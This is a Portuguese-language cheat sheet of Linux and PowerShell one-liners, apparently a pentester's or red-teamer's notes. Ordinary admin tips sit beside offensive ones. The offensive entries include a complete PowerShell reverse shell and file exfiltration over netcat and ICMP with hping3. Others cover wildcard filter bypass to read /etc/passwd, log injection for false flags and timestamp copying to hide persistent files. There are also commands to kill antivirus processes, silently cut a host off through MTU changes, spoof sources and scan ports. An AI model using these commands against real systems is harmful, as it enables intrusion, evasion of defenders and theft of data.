# Monitorar tamanho de arquivo:
watch -n60 du /path/to/file

# Executar v
sudo -s <<< 'apt update -y && apt upgrade -y'

# Backup com dd:
sudo dd if=/dev/sda of=/media/disk/backup/sda.backup

# Criar ISO de determinado diretório:
mkisofs -J -allow-lowercase -R -V "OpenCD8806" -iso-level 4 -o OpenCD.iso ~/OpenCD

# Criar e salvar imagem do sistema:
readom dev=/dev/scd0 f=/path/to/image.iso

# Executar script em DEBUG:
bash -x ./post_to_commandlinefu.sh

# Notificar no GNOME depois de executar script:
./my-really-long-job.sh && notify-send "Job finished"

# Realçar termo em saída do man:
man stuff
/pattern # Ex: man echo;/echo

# Verificar diretório onde um processo foi iniciado:
pwdx [PID]

# Alternativa ao tcpdump e wireshark:
wash [Interface]

# Leitor de tela para pessoas com problemas na visão.
# Pode ser usado para capturar informações sobre a sessão. Ex:
orca -l # Lista aplicações abertas.

# See background tasks:
jobs -l

# Take process from background:
fg +[JOB ID]

# Put process on background:
bg +[JOB ID]

# Stop process:
kill -STOP [PID]

# Continue process:
kill -CONT [PID]

# See processes using file/path:
fuser [FILE or PATH]

# Atalho para ps aux | grep PROCESS:
pgrep -a PROCESS

# Codificadores incomuns para comandos:
# Todos possuem codificação e decodificação;
morse [String] # Código morse
ppt [String] # Paper tape
bcd [String] # Punched cards

# Aletrnativa ao Hydra:
medusa [args]

# Alternativa ao openssl para gerar certificados:
makecert [args]

# Mostrar ranges de memória disponíveis:
lsmem

# Incluir mensagens no log do sistema.
# Útil para injetar false-flags em um sistema comprometido:
logger [args]

# Verificar quais opções como sudo o usuário pode usar:
sudo -l

# Informações detalhadas sobre o Host:
hostnamectl

# Enviar saída do microfone para áudio de máquina externa:
arecord -f dat | ssh user@host aplay -f dat

# Enviar arquivo criptografado:
cat $1 | openssl aes-256-cbc -a -e -pass pass:password | netcat -l -p 8080

# Criar popup em máquina Windows via SMB:
echo "TEXTO" | smbclient -M HOST_WINDOWS

# Criar popup no Gnome:
notify-send ["<Título>"] "Texto"

# Enviar arquivo via icmp com hping:
hping3 $IP --icmp --sign MSGID1 -d 50 -c 1 --file $1

# Monitorar consultas feitas ao MySQL:
watch -n 1 mysqladmin --user=USER --password=PASSWORD processlist

# Listar programas conectados à internet no momento:
lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2

# Listar arquivos modificados nos últimos 30 minutos:
# (útil para threat hunting)
sudo find / -mmin 30 -type f

# Encontrar arquivos criados durante determinado período AAAA/MM/DD:
find . -type f -newermt "2022-08-05" ! -newermt "2022-08-09"

# Monitorar o uso de memória.
watch vmstat -sSM

# Enviar comando para vários hosts conectados:
<COMANDO> | tee >(ssh hosta) >(ssh hostb) >(ssh hostc)

# Alternativa ao man para  buscar informações sobre binário:
wtf $1 # Ex: wtf ssh -> SSH: secure shell

# Fechar shell, mantendo os processos em background:
disown -a && exit

# Transforme o último comando em um script:
echo "!!" > script.sh

# Mate o processo que está travando um arquivo (Ex: Antivírus):
fuser -k $1

# Copiar permissões do arquivo 1 para arquivo 2:
chmod --reference $1 $2

# Checar data de validade de certificados ssl.
# (Ex: para monitorar possibilidade de hijacking)
echo | openssl s_client -connect <url>:443 2>/dev/null | openssl x509 -dates -noout

# Incluir timestamp no histórico do bash:
export HISTTIMEFORMAT="%F %T "

# Grep em PDF:
pdftotext $1 | grep <filtros>

# Desligar tela (para sacanear a turma do blue team :v )
xset dpms force standby

# Checar IPv4 externo:
curl ifconfig.me
curl wtfismyip.com/json

# Você pode usar padrões ao passar uma url para o curl:
# Exemplos tirados direto do man curl
curl "http://sub.{domain1,domain2,domain3}.com"
curl "ftp://ftp.domain.com/file[1-99].txt"
curl "http://domain.com/logs/[a-z].txt"

# Para visualizar headers ao usar o wget use o argumento --debug
# O --max-redirect é pra evitar ruídos de redirecionamento.
wget --max-redirect 0 --debug $1

# O framework do metasploit vem com dois programas
# para análise de binários:
msfelfscan || msfpescan
msfbinscan # Misto, podendo analisar vários tipos.

# É comum deixarmos o netcat aguardando uma conexão para enviar
# um comando automaticamente. Porém, se o socket for descoberto,
# alguém pode injetar comandos ao manipular a conexão. Evite isto
# fazendo com que o netcat ignore dados recebidos:
nc --send-only [...]

# Tornar arquivo imutável / impedir edições:
sudo chattr +i $1

# Enviar mensagens para outros usuários da máquina:
wall "Texto"

# Executar um comando quando um arquivo for modificado:
while inotifywait -e modify /pathto/file; do [COMMAND]; done

# Descobrir modelo da máquina:
sudo dmidecode | grep Product

# Verificar se há outros sistemas instalados na máquina:
sudo os-prober

# Alternativa ao traceroute || ping:
mtr $1

# Visualizar árvore de processos ativos:
tree || pstree

# Colocar um espaço antes de um comando faz com
# que eles não sejam registrados no histórico:
 echo "Find me if you can."

# Visualizar metadados de arquivo. (permissões, tamanho, data de criação, etc)
stat $1

# Executar comando em determinado horário:
# Ex: ping 8.8.8.8 at midnight
[COMMDAND] at [TIME]

# Consultar dados geográficos de IP:
curl ipinfo.io

# Filtrar arquivos por usuário:
find . -user $1

# Filtrar processos por usuário:
ps -LF -u $1

# Testar servidor SMTP:
swaks --to [EMAIL] # --server smtp.gmail.com

# Checar registros SSL:
sslscan domain.com:443 || sslyzer domain.com
                                  
# Baixar todo o conteúdo de um FTP:
wget -r ftp://user:pass@server.com/

# Alternativa ao iptables:
ufw

# Monitorar tráfego visualizando a quantidade de dados:
iftop [Interface] # Ex: sudo iftop eth0

# Checar estado do SELinux:
sestatus

# Bloquear USBs (para máquinas fisicamente expostas):
touch /etc/modprobe.d/usb_block.conf
echo "install usb-storage /bin/false" > /etc/modprobe.d/usb_block.conf

# Configurar políticas de senhas no /etc/login.defs
PASS_MAX_DAYS 90
PASS_MIN_DAYS 1
PASS_MIN_LENTH 16
PASS_WARN_AGE 30

# Utilitário para detectar alguns rootkits e backdoors:
sudo rkhunter --check

# Encontrar arquivos que não pertecem à nenhum usuário/grupo:
find /dir -xdev \( -nouser -o -nogroup \) -print

# Monitorar conexões TCP/UDP com informações do processo e do usuário:
watch ss -stplu

# Alterar tamanho do MTU:
ifconfig [INTERFACE] mtu [SIZE]
# * Maximun transmission unit é o tamanho máximo de um pacote de rede à ser transmitido pelo sistema.
# Pacotes acima deste limite serão descartados ou subdividos em pacotes menores. Reduzir muito o tamanho
# pode deixar o host incomunicável. Pode-se usar como método de neutralizar um host em uma rede sem levantar
# suspeitas.

# Bloquear acesso de uma máquina à determinado host:
tcpkill -9 host [domain.com]

# Atalho para alterar senha de um usuário:
echo "user:passwd" | chpasswd

# Pesquisar padrões dentro de arquivos compactos. Como exemplo,
# pesquisa por PATTERN dentro de arquivos de log:
zgrep 'PATTERN' /var/log/*.gz

# Converter quebras de linha do Windows (\r\n) para Linux (\n)
dos2unix

# Criar arquivo copiando os metadados de criação (timestamp) de outro arquivo:
touch -r source.file new.file
# * Útil para esconder arquivos persistentes.

# Verificar proteções configuradas em um executável:
checksec --file=FILENAME

# Wildchars para burlar filtros de proteção:
cat /??c/p??swd

# Executar comando anterior substituindo argumentos:
echo 123	# 123
^123^abc	# abc

# Listar arquivos em uso por processo:
lsof +p [PID]

# [POWESHELL ⇩]
# Checar IP externo:
(Invoke-RestMethod ipinfo.io/json).ip

# Checar serviços iniciados:
Get-Service | Where-Object {$_.status -eq "Started"}

# Equivalente ao tail -f:
Get-Content [FILE] -Tail 5 –Wait

# Listar usuários desativados em AD:
Search-ADAccount -UsersOnly -AccountDisabled

# Checar subredes configuradas, mas não utilizadas:
Get-EC2Subnet | ? SubnetId -notin (Get-EC2Instance).Instances.SubnetId | select AvailabilityZone, VpcId, SubnetId, CidrBlock


# Listar servidores não-Windows conectados ao AD nos últimos N dias:
Get-ADComputer -Filter { OperatingSystem -notlike "Windows Server*" } -Properties PasswordLastSet | ? { (((Get-Date) – $_.PasswordLastSet).Days) -gt 30} | Select Name,>

# Shell reversa:
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Procurar por arquivos executáveis sem extensão de executável:
missidentify -r -a

# Procurar por arquivos deletados, mas não sobreescritos.
extundelete [args]

# Recuperar dados em partição NTFS corrompida:
scrounge-nfts [args]

# Extrair dados de arquivo ou dispositivo e exportar em EWF
# Info sobre o formato: https://www.loc.gov/preservation/digital/formats/fdd/fdd000406.shtml
ewfacquire [args]

# Sniffer de rede com possibilidade de injeção de dados em tempo real:
hexinject [args]

# Framework para análise de softwares criados em Java:
javasnoop

# Utilitário para comunicação serial (com emulação para protocolos antigos):
minicom [args]

# Extrair arquivos de imagens (de disco):
# É parte do Sleuth Kit e do Autopsy:
tsk_recover [args]

# Framework com vários módulos para atividades de Red Team em powershell:
# É possível usar via terminal. Para os scripts individuais, visite o repositório: https://github.com/samratashok/nishang
nishang [args]

# xxd encode:
xxd -p <[FILE]
# xxd decode:
cat output.txt | xxd -p -r > decoded.txt

# Scan genérico nas portas 1~1024:
sudo hping3 --scan 1-1024 -S www.server.com

# TCP scan:
sudo hping3 --scan known -S 127.0.0.1

# Especificar porta de saída e porta de destino:
sudo hping3 -p [PORTA] --destport 7777 127.0.0.1

# O operador ++ incrementa a porta à cada requisição enviada.
# Cada ping será enviado de uma porta distinta:
sudo hping3 -p ++100 127.0.0.1

# Usando modo de escuta para interceptar pacotes HTTP:
sudo hping3 --listen HTTP -I [Interface]

# Alterar tamanho dos pacotes:
# O valor "0" é automaticamente convertido para localhost.
sudo hping3 --data 256 0

# Habilitar traceroute:
sudo hping3 --traceroute 8.8.8.8

# Spoof de origem:
sudo hping3 --spoof [IP] -S www.duckduckgo.com
